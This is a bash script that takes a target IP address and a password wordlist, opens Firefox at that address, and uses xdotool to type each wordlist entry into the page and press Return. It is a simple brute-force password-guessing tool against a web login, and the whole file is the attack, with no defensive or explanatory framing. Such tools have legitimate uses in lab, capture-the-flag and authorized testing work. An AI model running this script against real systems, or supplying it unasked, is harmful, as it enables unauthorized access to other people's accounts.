#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IPv4-addr> <passwords.txt>"
    exit 1
fi

IP=$1
WORDLIST=$2

firefox "http://$IP" &
sleep 5

xdotool search --sync --onlyvisible --class "Firefox" windowactivate
sleep 1

while IFS= read -r LINE; do
    xdotool type --delay 50 "$LINE"
    xdotool key Return
    sleep 1.5
done < "$WORDLIST"
